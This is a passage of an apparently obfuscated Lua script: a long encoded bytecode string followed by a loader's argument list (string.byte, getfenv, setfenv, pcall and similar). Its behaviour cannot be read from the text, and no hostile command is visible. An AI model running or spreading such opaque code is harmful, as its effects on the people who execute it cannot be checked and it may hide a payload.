OC37Q83CZ23AVI3BWH3AYS3KIF3LPN3AOL3FKF3E9M3I8932HV3AVK3O6X37SH3AQO336T28M3A0437R139H03C6W3BVH3BYD3BVH37QW28M3O6F37SH3BM43CZI3DBV3JZN3LMO3O1R3BXI385B3BM43GL13AWK3EMY39DD3DRN3FX03JQS3EIK3JWE3O4V3JUH3LJ63O0X3NIF3O4Z3NO63NCG3NU23O5334L63O5532NR3O573GDF3AIG2BO2663O5C3NUA3HVE3O5E3NON3O5G3J0K3O8T28R3FFB38V03O5Y3DHF39PB3BNB3E0F3KT83FY43O663FAS3O683M4V3O6B2793O6D3O7X32ZL33FB3JN43MEE3KUH39FN3MFP34RS3O6N3DQW37R13O6Q3CTS3LP33KZU3B1S3O6W3AZ53O9Y3EBI3FJW3AY63K1K37Q83LGB3AVI39V33O793LB83O7B3AVB3D4V373B3AVI3O7G3AZ33O7I3OA639JS3O7M3G2L39H23CT132XO3O7R3G6S37PX33EZ3O7V3CYY3O7Y3DER3F9Y3DBM36NF358D3O843A9E3O863GB63B203O8932XE3EIG3O8C3EQA3FTF3NJ23NOT32GX3O4W3O8K3NCD3O8M3NO83O8P3D3I32QZ3O953H3X3O8V27D25A3O8Y37X33NCS3O913NUG3O933E5N23Q3OBU3G083O983M6B3CH334EE3O623BIS3FPP3FE43A9E39RY3O6932X23O6B3OB03NTJ3BM13BL33JYE3D9J3O6J3HZP3O6L27C3O9W3DES3OAP3CA1331N3MGJ3OA23D7A3O7H3OA533153O6Q3J8A2BA3BWH3KZX3BLK3HBB3KY932YT3O783CFH39QB3OAH3DOR36DA3OAK3A3H3OAM39VJ3OAO3OD639GV3BP63O7N3OAT37PX3CQ03OAW3H6V3OAY3O6C3OB13CK73CUK3F6I3DBM36WW3OB73O4M3OCO3O873ESV3JK03O8B3O3X3ETD39V43CD23ND13IWE3MY93O8I3NTW27A3O4Y3OBO3NU03O8N3O523F4A3H5C3O8R3C313OBU3AIF32FK2BO24E3OBZ35FB3OC13LY83NUF3N6H3EJD32S122T3O153IIT3O173O5N3EIN3O5P3EWO3O5R3O1E3O5U3D6K3ABB3O5X3OCA3O603CNX3O9D3DB43O653CYY3OCI3O9J32IK3OCM3BVI3O6F3O9P3O6H3CZD3OCS3JJY3C6F3OCW3HLW3O9Z3A0B3OD03KWJ3K1X3OD33OAN3OD53O6Z3K2H3OD93KZW3OAA3DEH3ODE3O723LSU3O7A3MIY3B843ODM32YT3ODO2B43ODQ3OGI3O7L3MUP37SH3O7P3ODX3CLV3O7T3OAZ3OCO3AAM3OB23CRP3OE53EBM3OE73EKN3O853AP13CPW3OEC3O813HPJ3FZH3NZW3OEG3BHS3OBJ3NUK3OEK35GO3O413NCA3NTX3NCC3N5V3OER3OBQ3OEU3O5432HZ38JJ3OFA3O583OBW27C23I3OFA3O5D3OF63O5F3MYZ3FNQ3OFA3JWU3GZ83EWB3H8W3ISL3GZD3JX13GZH3ISR3EWO3GZL3IQW3EWT3ISX3IQZ3ISZ3JXA3IR33EX13H9H3EX43JXF3IR93EX93IRB3DVE3IRD3M5I3H0B3H9T3ITG3H0F3EXO3OFO3O0G39S53O9B3BK33OFS3O643OCG3AAM3OFW3O6A3OFY3OCO3O6E3O9O3OCQ3HZO3OG53JYZ3O6M3CBX3OG93CK73C8W3L2F3MJC3LS33O6V3COQ32ZM3AYJ3OCY3KX33OGK3MJF3OGM3ODD3I893ODG3AM23ODJ3O7D3EFP3O7F3OA43OK83ODR3OAQ3OH13O7O3OAU2AP3ODY3G9K3B5F3OFZ3OH93OE33CFZ3JK03OHE3OB83OKY37W03OHI3EV93ESQ3OHL3G2I3O2X3NFZ32X13BTG3NUJ3MB23O0W3OEN38RO3NTY3O8L3OHZ3O8O3OI13O8Q3OI33GU13OI53O8U3OF032T73OIA3O8Z3NCV3OID3JSY3G953OFA3O493GDX3AF23OJE3J173AZC3OJH3DLW3O633DQJ3OFU385B3OJN3OCK3OJP3O9M3BM33OJS3O9Q3OG43J363OCT3MEK3OCV3OJY3CTP3OKO3OCZ3OK23LS23AYD3OAD3OKM3AUX3OMT3OKA3OGP3ODB3O6U3OKE3O773AYT3OAF39ZK3OKI32HV3ODL3OKL3OK63OGY332W3OKP3ODU2BL3OH33OAV3OH539DJ3OH73O7W3OMJ37QS3OE43OL13F5Q3OL33O9N3OL53CGW3EV43BIY3OEE3NZW3A1839GO326G32J232TY3II03N8239I83HAM3AI83HIN3BSO32XE3HXO3KRH3FYX3OFA3M5G3HD83J0P3H0A3MWV3M5L3MW63M5N3HD73M5P3HKK3M5R3HKM32V73J113HKQ3HDM358D3H7Q3O2L3GSE3H1R3AZV3N9B3BX53FY43E943GTP3OP739SO3N1V3NRE3IMG3HF13CK93H603CGS3DX63BUZ39HQ362X3NC43KJ53ACM3OO632J932J132VK32B93OOB3D5C31803OOE29G3OOG32IZ3HEJ3O5I3DMC3OFA3M6J3DDC3M6L3DDU3M6N3CDN3M6P3G1N3H2V3G1Q3M6U3G1T3M6X3H333DDX3M713H373DE43OP33HKV3GE23OP63N9A3OPE3OP938QG3ED63GXF3BWY3OP83N913OPG3K363CTD3CHR3OPK3KJ13DW53OPN335L3OPP3NNW32FX3OO43LK03OPT3OO83OPW32YT3OPY3DPN3OQ03HAP2FE3OOH3OQ53HYO27H3OFA3MWL3J0U3MWO3HJ33MWQ3LFS3HJ73LFU3GI63HHY3LDS3OIL3GWZ3O0H3OQS3GQU3OQU3NLF3JY23OCF3OPB3OR039ZW3NWR3OPF3CYT3OPH3OR63B1B3OSH3BYS3C1X3LBC3HAF3ORD3O0T3L0I3GHE2KW3OO73OPV3OOA3FB83ORO3HBO3ORQ3OQ43HFI3IZM26E3OFA3M053GLU3OQR3NZL3OSB3H4K3OPD3AVA3CG13OPA3H743OSI3B7V3OSK3N1X3OR53FPX3BJQ3OSP3AG03OSR3B6D3OPO3NI83IK13GQ83ORI3OT03OPX3OT23HM53D0U3OT53OOI3E5N26U3OTA32SE3OTC3OFP3H5N3N8I3GY93OTG3OQV3OTI3OQX32ZK3OSG3GA03BZR3OSJ3NF13OR43I833OTR3GOX3BUG3OTV3ORB32XJ3OSU3O3X3ORG3DS43OU13OO93OU33N843OT33HEB3OU73ORS3JWR25I3OFA3JPG3OS83NZK3O3K3H6T3GN33OTH3B573OTJ3OQY3OUN3GBJ3OVL3AYD3OTO3N2A3OUT3IM53GSQ3OR93BVM3OUY3D4V3OPQ3K7C3ALU3OV43ORK28C3OV73OU53OOF3LKO3JVS3HLG3ORT27A25Y3OFA3NVW3KMH3JDD3OTD3OVI3H7S3GPP3OVR3AY83OVN3OUM3OTL3OWP3NFM3OUR3OSL3OTQ3OVW3OR83CHT3OSS3G883OV03OO33OPS3BSN3OPU3OV53ORL3OU43NKC3HHA3OVA3OWD3JWR24M3OFA3O293GZF3O2B1I3ECV3HPE3O2F3HNB3ED03OWL3HYU3O3L3GPO3OSC3OUQ3CU83OVO3OWT3OUJ3OVM3OWW3OTP3OVV3OPJ3OTT3OPL3D7I3OW03D9O3OW23IAG3CD93OW53OT13OW83OXC3OU63OQ33OWC3F4Y2523OFA3MR33OXS3J193O4G3GFM3OWO3OY13OVS3OUL2793OVP3E483OYV3OWQ3OY33OVU3HMQ3OWZ3OY73OVY3OJT3HOB3OX43OLB3OYD3DJQ3OX73ORJ3OYG3OOC3OV83OXD3OYK3HK53G603OOK3IQJ3M5H3HD33HKC3OS63LFY3HD83OOS3HKI3HJ93J0Y3M5T3HDJ3M5V3OP13OVG3O1K3OSA3OP53OUI3OSD3NRE3OSF3OY03P093N283OUS3OZ53OY63OUO3BVX3OUX3GD93OZB3O4R32X23ORG3DPK3OYF3OV63OZI3OW93OQ23OWB3OZM3HEK2463OQ83E7N3H2M3CDG3H2P3DDV3OQK3M6Q3DDL3M6S3P173H2Z3OQE3G1U3OQC3M6Z3G1Y3H363LEZ3OQQ3OUE3HA03OQT3P083OXX3OMC3OQZ3P0I3OTM3OR23NFD3P0F3HCD3P0H3GW33OTU3OPM3P0L3OTY3OPR3HQQ3P0R3OXA3OYH3NQ33OV93OZL3OXF3HFJ35HM3MMQ32RH3GC43AEH3JJ13BDP3MMW3GCC3BDV3JJ73MN03BE03MN23BE53P043O2K3P063GVR3P1N3OTN3OYX3P1Q3OVQ3OZ13OWV3OR33OWX3OY53CGJ3OX03P0K3GST3P0M3K903JOH3BXH3P253OW73P0T3OYI3BSO3DAG3D373D883ACO3DAK3D8C3HBO3D5W39MJ3CUT1E1V3A671528P3NQ932T03D163GQM3O4A3M7Z3EF23NKP3HNH3OVQ3G783OWU3NLG3P1P39HW3E9R3P1S3OQW3P333OY43EVJ3AA83CZD3D233EBM3M0X3D9O3ENK3EC23D9S3P203GST3D9W3ORE3KJB3GMK32G03P3E27A3ORM3DJE3OZJ3OU63P3J3D5P3CXL3DAJ3D5S3P3H3D0V3D3G3D8G3P3S3P3U32HK3P3X3HHI32T33EBB3NW13HI43NW33E933P0C3P1O3G0I334T3EDT3OUP3P2X3P4G3OZ43ET03D213D783P4M3MRT3ET33DBP3COM3DBR3OY93GD93P4U3OSV3CZY3O0V3P4Z22U3P5132H13P533P3I3FKY3P3K3P573P3M3P593P283HHA3P3Q3GDK21I3P3T3P3V3P5H3HEK22E3P3Z3OWI3NKM3E5Z3P1K3JXU3G6Q3OYZ3BCC3P313P4A3P5R3P4C3P4Q3P4E3OUK3P5W37R03EUW3P5Z3DBJ3CZG3P623E4W3ET43P4D3N9G3P673P4T3P223IPF3OSX3P6D3P6F3JVG3P0U3D853P6K3IF83P583D8B3P0U3P6Q32I53P6T3P5G3F8N3P3Z3LE33E7P3LE53G653E7T3IR43E3E3LE93EOX3LEC3E303KLF3E853KLI3LEH3E893LEJ3GZ93E3E3E8F3ITF3LEO3KLT3LEQ3E8M3LES3E3R3KLZ3LEW3OQO3P1I3E423P723OP43P743P5P3P5V3P4B3E6V3P5U3P1T3NR53P0F3P5Y3D9J3P4L3P7J3OHK3D293EVN39GU3P4R3P7P3GW63P693O3X3DA132ZT3BBB3OSZ3OX93P3F3OPZ3P7X3P553D873P6L3JUP3P6N3OQ13P843P5E3P6U3FYX3P3Z3HN13DNI3DN73HN439OQ3HN63DXV3PAE3EYY3DY03M7H3ISK3OZU3P443NQL3NKQ3EBF3P753P9D3P4F3P9B3P5T3OR13PAW3P9F3P343P4I3P7H3P9J3EKP3MEH3DBN3EQ23P9O3BUG3D503OYA3A8E3OYC3LCQ397N3P9W3OX83OW63P503OXB3P6O3P543P6J3P563P803P6M3P823P5A3PA83A0L3P863P3W3FIA3P3Z3LG832H73P5K3JCQ3O4F3MCU3DWT3PAU3PAZ3P7D3PAX3EFT3PAV3PCA3PB13P4H3P9H3HZO3PB53EN63P9L3P633H0W3EFU3B843OVZ3P683P7R3NRO3LKN3IJC3JRN3MR03A2S3P3Z3KQU22321123E23X23O22823G32G0335K3CXH1I32UD3KB31I3HY53DGE3LHD3HSX32W63IIR31EQ21E28E3AIK21E39O93D0J32GI2A432YT3EJ83D8O1V27Z2BO1U3PC03G1A3P6Y28H3KMG3P7037RT3N8H3NEV38AQ3D9R3NZO3F2N3D1T3EPV3DQS3EVI3GL139UA3CTH3OHM3F5S3CNT3FUT3H3R3DF13H6Y3CZQ3KT236NF35WV3G72385B39SJ3EL63O2U3NRM3O4Q3P3B33063ACM3MQY3L7Q3KEK3H463PCZ3NJ13PD13PD33PD53PD73JF33PDA3PDC2983PDF3KOD3PDJ3HTO3PDL3PDN29L3PDP39D03PDR3HXU3PDU3ELX3PDW3PDY27D2723PE13HEK25I3P3Z3O073JR03KEQ3O2G3M7I3JR43LV63O0E3PE73NEU3P5N3PEA3DBQ3NL53PED3OHJ3PB73DTE3EHH3PEI3FFN3AR13PEL3FFV3PEN3D7A3PEP3H4N3PES3G573PEU3GD03PEX3CL43EL73ET83EL93O3X3O8E3IZ63PF63M013L7R3OWF3PFA3NOQ3AJP3PFC3PD43PD63PD83FKY3PDB29U3PFJ28E3PFL3LX2313J3PDM1K3PDO3PDQ3D363PDS32B93PDV1L3PDX34Y627D2663PG13OQ624M3PE327A3FXS3MXN37YJ3PE83PGF37OC3PEB3N1S3PGJ3OL73EUZ3PEG3PGN3GB63PEJ3PGQ3OLA3PGS3DJ43D4T3OTX3KT03PCP3MD63MFP3PGZ3PEW3A9E3PEY3AG03PH33GD93PH53NZW3PH73OEH3LZZ3MQZ3M0232O73PHD3FKU3DCX3PHG3PFE3PHJ3N173PHL3PDD3PFK3PDH113PFM3IWI3PFO3PHT3PFQ3PHV32JQ3PHX3PFV39WF3PFX3PI23E4T3PI53OWE39IB3P3Z3OTB3DWN3PIC3PGE3OYS341C3A983AAM3D7G3F2M3O3P3OO03EMT3FSN3G9M3PIO35GT3PGR3BFM3PGT3DBL3OX33PGW3LLP3JYZ3PIZ3IO83PJ13PH23PF03JOG3PBF3PJ83ECC3GJ63LGN3PHB32FY3PJE3FEH34Y03PD23PHH3PFF3PD932G33PFI3PDE3PHO3PJO3PJQ3JSY3PJS3PHU3PFS3PHW3PFU3ETX3PJZ3PI03PFY27C24E3PK33JWR22U32TS3P8A3E2I3P8C32VY3P8E3KL93P8H3KLC3P8J3E833KLG3GZ93E883E3A3E8B3LEK3P8S3E3G3P8U3KLS3E3M3E8L3E3P3LET3JHF3KM03E8T3M723E413PGD3P453KSQ3PGG3PKE3N263PII3EN43PIK3ESG3PEH3PIN3PGP3PKN3PIQ3PKP3PIS3GG53PEQ3G883PGX3H3I3A8E3PEV3PKX3AAM3PJ232ZK3PJ43GST3PJ63OZC3HPJ3H7B3F1Q3ELF3M8F38IV32TS3PD03PLC3PJI3PFG3PLG3PHM3PLI3PDG3M933PLL32U93PLN3PJU3PLP3PJW3PLR3O223PLT3PI132R832U43HHI32TS3FSD3F133PK93PMW3OUG3PIF3PGH3PEC3PKH3EVF3OHK3PGM3EKD3PGO334S3PEK3PN93F9B3BZU3PIT3ORC3PKT3H7X3JY83PNH3PH03PKY3BVX3PNN3GW63PNP3P0N32X139CN3OXJ3AEA3OXL3OXN3O2E3DN43PAN3ED034RS3CYQ36Y539CU3CLY3L3827C32D53N6I3NJ33GHJ3CUY3OHS32JH3PQ22EQ39WE29G3IDW32JQ3HD23AKV3BGW31JU32H03POB3PHA3HW73PLF2813PLH3PJN3PO63PHQ3PO93IEV3PJV32JD3HXU3PL63PF8347Z32TS31HR39OL3AB63O1H133PDA2ZT32JJ32U632FK3PR32T13MZO39EX3D0L3NE13CCF3BST29G3PJY123PK02BO22M32TS39OG3IIG2BE3H293OVF345Q3O5Z39CU331D3BC23H203MNF3KMX3GE53CZ93JY23I0D3N1Z3JZF3KSV3KYD3LB737R138R83HZS3JYM3OMV3KKD33873I3N27D3I273JZ8383J27G3PC83MNG3MDY35RW3A1Z39L53I3A39UF3FM83PSA382J3PSA3K103DF13I3C3N3P3I3C3LMD3M1N3NS53CWU3AXX3KGJ3J9037Q43NA43MG33K1G3LN73OLC3PT53NS13JMP3NXH3LOJ3LP13N363J5H3PT83I8932X435WV3BAX3B7F3K0K21Y332B333338993CFD39S43C513AVW3P3C3DUL3ASF32X229I3ML93OH13K2V39F53NGM39VU3NNL3CHS3PSZ3FA032YT3FAM3A393AN335U93DZF3BYD3AOD3PPT3BOB341C3N1X3AGN3G4D3E1U3AIH3MBL3IZ93MBN3LWW32K432TS32HV3PFR3EIQ3K8P3M8U39W73GBS3PRE3C2P3D3M3FP93PQ13LIY3PQ33CUX3PVG3IGH27A3CVE32JM3DC732J53NCN3CV83CVA2YR3CVD32IY3CV232JN3PQ932JR32JT3PQC2BD2EQ3PV53PQ629F32S532TS31LK3E3I3MX8112143CDH1F29E3AE33KBA3A0L3PNX27B2143DJO32S831NX3MP83G003PRO3GAH3POI3GRE3OI73N0W3PV33MQQ3AJ53IFJ39O932O33PWP27D1U3PX432FR32TS2SU3HY032U63HYH3PWM2AJ37P826M3PX727B26U3PXI27A2723PXL35XM3PXO25Q3PXO25Y3PXO2663PXO24M3PXO24U3PXO2523PXO2NI32LZ3PXO23Y3PXO2463PXO24E3PXO22U26A32KG2323PYD38JJ3PYG3CN93PYI32MG3PYK3MHV3PYM3G923PYO34QY3PYQ2123PYD31RR3A6327J3D3M27X3HYB32S53PYU3JI332UM32PC3PYQ21Q3PYQ163PYQ1E3PYQ32493H583HEK1U3PYQ32X231BB32KG26M3PYQ26U3PYQ2723PYQ25I3PYQ25Q3PYQ25Y3PYQ2663PYQ24M3PYQ24U3PYQ2523PYU3BHB3DMB25A3PYQ23Q3PYQ23Y3PZH3F7Q3F7P3PYQ24E3PZH31RW3A053Q0I38LU3Q0K32K432R83Q0M37QG3Q0P3JNU3Q0R347Z3Q0T22M3Q0T3OEH32K43Q0T21A3Q0T21I3Q0T21Q3Q0T163Q0X3OHP27D1E3Q0T1M3Q0T1U3Q0T26E3Q0T26M3Q0X3OLE32PI3Q0T2723Q0T25I3Q0T25Q3Q0T25Y3Q0X3CNA3PM232V13KL53P8D3KL73E7U3LE83E7X3P8I3E813P8K3LEE3LEK3PME3KLL3HD83PMH3E8E3PMJ3KLR3EME3PMM3LER3E8O3LEU3P913E3V3P933M7338VW22G32XJ37CF39DA3IJZ3N963BCK3BR93C1P3ODH3G2F3G0F3LA637QW2AP22I37GH3NHD3Q3735O03BIY3JQA3MEB3KU33LA63JZD3KGZ3MF53GE53DEV3B7M3PUG3A9U3NLZ3IOY33IB3B6K3I6638NB3NHQ39HB3AP13PU23I8D3A3H3Q3H3KJN39VI2YG39H93AMB3BJC3ODS3BOW3JC42BL3EIB3BVF27G39LY3BYD39LY3K103FA63LMK3JOG3FQ93AR32VU3AA232Y13DIS37FK39TX3ALV3O733EH62B438SN3A9E3Q4X3AW839TE37E72AP3Q4X3AZU3Q4X3AYW3NRQ3LQ23MEO3ODI3MVM3DOR33413KZE3Q4V34ZD385B3Q4X3AVQ37TO36T13OO43IOV3LNF3AOA32XE38993DA132XV3AQ139583DOR3DFL39KR37OH35WV3DP23J8S3CLI31803BOT39UJ3PTO3ARN3DZY3Q613A2M3F9B39UU331C3KZ83BLX3K2J3BKT3N3V3MJ03BV4330H2B438UQ3FE33Q6P3Q573PTF3Q6G3NBH3CYU3ODB3Q6U3F073IAL3Q6J3A2M37VB3Q5F3EF62B438V63A9E3Q773AW83BKT3AUB334E3FAM381L3D9O3CWQ3OG33OGB3J5H39L53B1Q3OL03AAM396W3I6B3ANM333Y31023D7P37DH3MIH3H0O39RL3AY8311L3Q583CHX31023AM23DG53BZ9311L31EX37WM373B310231HR384137E72LN3C0H39KM3CK637W03ASI33873Q7T39RB333B3LNM32ZI3L8I3Q803OLC3Q823ODH371J3Q8538023Q873MGL39QB3IKB3AYD2RQ315J37V93Q8A3JZE331S3Q8E3C0V2793Q8H2BL3CKK3K3X3Q7R22V3Q8M32FX3Q7V3JYD3Q7Y3Q863N2X3CYU3Q833CLL2LN3Q7P3Q9D27A3Q7P35O02LN3EIK330W31023Q4P3BAV3PUG3Q8Z3FE0389Z3QA63A8E33IB311L3DJA36ZC3APS315J37R13C2D330W317H3L8I316C32073Q3H389K3CLL317H3C2D3Q4527A3C2F333Y2LN38GV37R1394M3BWT31023LR637R13I6Q3BP52LN3AUW33323AUY3FE3397D37VR31023Q4R311L3O8E37DH3Q9R3Q6M3Q9I22U3QBC382J3QBC336T31023KJR358D3FWP385B3QBC3I6O22U38VQ3BVI3QBZ3NXL3JAU3DWD3L1W3MJW3KEZ39ME3L183B5W39M73JNY3QC53MUW32YT39BM3QC83K673B603QCB3DTX3Q5N3JNW39BQ3E1V38463DOR3IO43QCK38ZV3QCM3I8939B13QCC3LTF39B83AUM3OGV3OSW3MUU3LC33P4W3J9U32HV3LC63QCT3QD33IOS3A3H33G73L143NXU27A3I633A843QD23OTZ3QDC32YT3IPW3QCY3QCQ3A2M3O5Y3QDJ3QDF3OW33QCE380F3QD63MJZ3A2M39IG3QDT3QCC3QCV3AVI3I7C3QDP332I3DOR3I7H3QE23QCL3BR93AVI3LKS3QCH3OAI27A3K5U3QEB3DL82933FAF3C4L3ON9383J29332XN385B3QES3AZA39PJ3B3X2AP3QEU3O6Y27A3QEU3BLK3Q583I6132YT3FE63Q5T3MJO2SU3I7V3J9J3DRE37QW3QER3CYY3QEU3I873Q5L3QCP3QE83A2M341N3Q5U39DD38993LCM39KG3B7N34283IPF2SU3DU539S63Q6039VG3FVG3OAF3OMX3A3H3Q663Q693B5739R73L2F35WV3F773B7F3QG237QG2BT3AVI3N3S3BQT3O8233043AQ1342J3D5239JJ3M483NQU39S63EPK3JO835D63IP73BR93ASS343Z3IPA343F3QGV388W3ASS344U3IPA344939LC3QGB3AZZ3Q9P3QF53M263CHX3QEP3LSC3QF63K5H3BKT3AQ134553K5L3QFD3NH139V43BYL3G0K37FU3QF33Q6T3I893IMA3QHE37WE3AVI3QF73MVM3AQ13PRS3QFC3DQJ3B823BAK3DW237XC3BRR32NJ38B23AVI34602Z23Q7F3L1W3QE43A3H32K1334131HR39C93CWR3LSA3CHT39U7384C39TX3MVA3AAM38MV37W03Q9N3392311L3KJR3QBI3JYD311L3L8I2RQ3Q8137DH3Q8S3BV437OX31023QIV3BAV37R13QJC35O03Q8B3M7N3BAV3QA32RQ3PUG3Q943F9Y34MT3QJN3Q3P333H3FB036ZC39KP31EQ37R138HR37W0316C3L8I2JL31LK3Q3H316C3CJ8389W3QJY39HA2BL3QK83QBQ3FWI3OB93B7435U9311L38CV3OCN3QKI3C783L0Z37FU3QB9331538NF3B2X3CWF38FY3QJA340Q37FU39L4331538KL382J3QKQ37VR3QBG33MB2RQ3ENU3QJ73CGQ330H311L3QL13QL037XC333Y3QL33B7H3CWF3NB73QKF39UJ383E3OCN3QLL3BOL381H32NX39QR334A3DL62933MKL3NXT3FGW3QGJ3ART3AZ93K9C39S63C5139UE3APB3A1U39Z832FW3E7539KR3KGJ376C3QGS3LCN3QFW3CO62FP38T03N5937SH3QMI3APX3B5K38AJ3AQ13HRF3MV4385V3ASS3JRE3IP83M4D3PH732XV3Q9Z3D04388U3APS388T3B2F3DOY3QIF36WW37DO3K3D39HX3QIN3QMM38OV3AP43BKT3ASS3N1K38063AQ12T13C1C2FP38XQ3QMJ37R13QNN39R63BL637PN2AF3A7M3QMX3FK22SM34BN3JOM3API3FN53NFX37SH38XD37QS2RQ31EX343437S42RQ3QO53QK927A3QOC37P63OAH3QO727B3I8F38063QJL3F7K331T2RQ37U03CPT3QOQ39ZW3F7O331D3QJQ3AR439V03QOM3JKS39QB3FHH32LX22V2NX31EQ3DN037N63F7O3QKD385V38AP3DUN388U316C31EX3K6G3MSN388U38BG3FI3388U39LY3MT637RE31EQ333V3Q7E33OW37QV35U92FP38UO3OCN3QPX3QNC3AZC3QFR3ASR3B7N34FT38M93QNJ3BO22FP394G3QNO33153QQA3QNR3BMR3QNU32ZN3QNW333B2SM39II376C3QO13CZY3QO337R139433QO63DUG34IG3QOA35V137FU3QAT3QQW37PX330H2YG393Z3CPT3QR327A3QN83AGR38AS3QOU3FKM315J34GS39L83BR93QP527B34HV3FKP37TY32XP3BR9312F320734J03846385U388T3QOW31LK3QPS334A3ILE3A1U34K43NNM2FP38ZC3OCN3QS23QQ03BQS3QQ23APH3H5C39V03QQ73BPJ2FP39C03QQB2BL3QSE3QQE3BO93QQG32X23QQI3QMZ3ADO3JO63QQN3LCN3QQP331539AG3QQS31EX3QQU37OX2RQ3QSU3QOD36QJ3B743QR122U39A33CPT3QT63QR63K4N27D3QR93BR93QOW34O73CRM33043QRG3PVL2BO2NX3QRK3ALQ388W3QRN32TD388U3QRR3MT8315J3QRU32ZB3QIF3QRX39UJ34QQ3BVF2FP39733OCN3QU33QS53CKU3QS73ASS34NX3QQ63AZ93QNK38XW2FP2563QKN37SH3QUG37W02FP3QQF3QGI3PNR385V3QSN22U34PL3IPN3QSQ3IPF3QSS37P33QHR330S3QOI3OEO3AYG2RQ2583QQX3AZ63QT33L0N22U25B3QHP37R13QVA2BL3QR739EM3QTC388W3QOW34R93QRE388W3QTI38TV3QTK3AV4388O38HK332I3QTP27A34UL3QRQ386X3JJN3QTU3QN533OW3QTY29334W33QS0326H3DZV37R124V3QI839VC3QS63MVM3ASS34WL38DY3J7X3QMF3QSC22U24A3QUH37R13QWM3QUK3QNS22V3QSK3PF4388W3QUQ34X53QUT3I0P3QUV3I0P37R124C3QUY333H3QSW3QV237DN3QV53QX23QV72YG24F3QVB33153QXD3QVE3QTA387H22V3QRA333H315J34XM3QVL38FR3QVN3PK137RE3QTM396I385V3QVU37Z53QTR3QVY3M2E3QW03DRH3QTX3A7A3DGL3QU122U23Z3QW833153QY93B2X39J93QQ13QWE3B7N38XF3QUB3QWJ3C782FP23E3Q373QKO2BL3QYN3QWQ3QUM3QNV3BR93QUQ3M943ASS3EG239S03NRO3BUE3Q373QOV3QQT3QX723G3Q373QQY3QZ73QR03QV823J3Q373AMW3Q393QVF32X13QVH38FR3QOW39XC3QTG385V3QVN38XW3QRE3QXU396R388U3QXX352T3QVX3QLP3QVZ3MEY3QRV3F7K3DIU3DXF3QY72333Q373BYD3R063QYD3BQT3QNE39SO3ASS3AKJ3QNI3QUC3QQ834YV3QYO3NN23Q373APC3QWR3QWT32FX3QSM3ET93IX93QYY3QO23QX1331522K3QZ33QUZ3QZ53BRK2RQ3R0Y38ZF3QJE3Q37331T2YG22N3QZE37SH3R1A3QXH3QN93QZJ384A3QOW35583QXP384A3QVN355Y3QZR3QZN3QVS32XV3QXX3ADJ32XV3QTS3QZZ3NS63R013JKS3DIU357F3QW62273R0737SH3R233COX3EIH3CLZ3E1U',{},40,2^16,{},"\115\116\114\105\110\103",'',string.byte,string.char,string.sub,table.concat,(math.ldexp or(function(a,b)return a*(2^b);end)),(getfenv or function()_ENV['\95\69\78\86']=_ENV;return _ENV end),setmetatable,select,next,math.floor,string.format,(unpack or table.unpack),tonumber,table.insert,string.gmatch,tostring,type,_VERSION,pcall,string.match,string.find,(debug.getinfo or debug.info),string.len,rawset,string.gsub,math.random,(table.find or function(a,b)for c,d in next,a do if d==b then return c;end;end return nil;end),rawget,_G,print,setfenv);end;
